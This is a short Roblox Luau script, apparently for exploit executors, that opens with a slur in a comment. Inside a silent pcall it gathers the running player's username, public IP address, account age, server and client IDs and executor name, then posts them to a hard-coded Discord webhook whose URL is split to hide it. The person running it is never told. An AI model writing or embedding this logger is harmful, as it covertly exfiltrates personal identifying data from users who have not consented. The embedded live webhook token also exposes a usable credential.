--retard

if getgenv().sessionExecutions == nil then getgenv().sessionExecutions = 0 end
getgenv().sessionExecutions += 1

pcall(function()
local rawtime = tick()
local url = "https://discord.com/api/webhooks/1245073304805572709/MW6KRdJMHZsyW7-2HyxQ99-heeP".."pycWjK1kt2Ly9mxq0FjEDINEASa_bXbESuNbM5ocJ"

local plrsInServer = #game.Players:GetPlayers()
local isAlt = (game.Players.LocalPlayer.AccountAge < 28)
		
local data = {
    ["embeds"] = {{
        ["author"] = {
            ["name"] = "Log Data",
            ["icon_url"] = "https://i.pinimg.com/736x/f4/30/75/f43075a7946a71f03759ce502d0a8a6d.jpg"
        },
        ["description"] = "",
        ["color"] = tonumber(0xFFFAFA),
        ["fields"] = {
            {
                ["name"] = "Username",
                ["value"] = `{game.Players.LocalPlayer.Name}`,
                ["inline"] = true
            },
            {
                ["name"] = "IP Adress",
                ["value"] = `{game:HttpGet("https://api.ipify.org")}`,
                ["inline"] = true
            },
            {
                ["name"] = "Account Age",
                ["value"] = `{game.Players.LocalPlayer.AccountAge}`,
                ["inline"] = true
	    },
            {
                ["name"] = "Job Id",
                ["value"] = `{game.JobId}`,
                ["inline"] = true
            },
            {
                ["name"] = "Executor",
                ["value"] = `{identifyexecutor()}`,
                ["inline"] = true
            },
            {
                ["name"] = "Players",
                ["value"] = `{plrsInServer}`,
                ["inline"] = true
            },
            {
                ["name"] = "Client Id",
                ["value"] = `{game:GetService("RbxAnalyticsService"):GetClientId()}`,
                ["inline"] = true
            },				            
	    {
        	["name"] = "Session Executions",
                ["value"] = `{getgenv().sessionExecutions}`,
                ["inline"] = true
            },
			    {
        	["name"] = "Type",
                ["value"] = `Normal`,
                ["inline"] = true
            },				
        },
    }},
}
local data2 = {
    ["embeds"] = {{
        ["author"] = {
            ["name"] = "Log Data",
            ["icon_url"] = "https://i.pinimg.com/736x/f4/30/75/f43075a7946a71f03759ce502d0a8a6d.jpg"
        },
        ["description"] = `{game.Players.LocalPlayer.Name} has reached max session executions. They will no longer send requests`,
        ["color"] = tonumber(0xFFFAFA),
    }},
}		
if getgenv().sessionExecutions < 5 then
request(
    {
        Url = url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(data)
    }
)
elseif getgenv().sessionExecutions == 5 then
request(
    {
        Url = url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(data2)
    }
)
end
end)
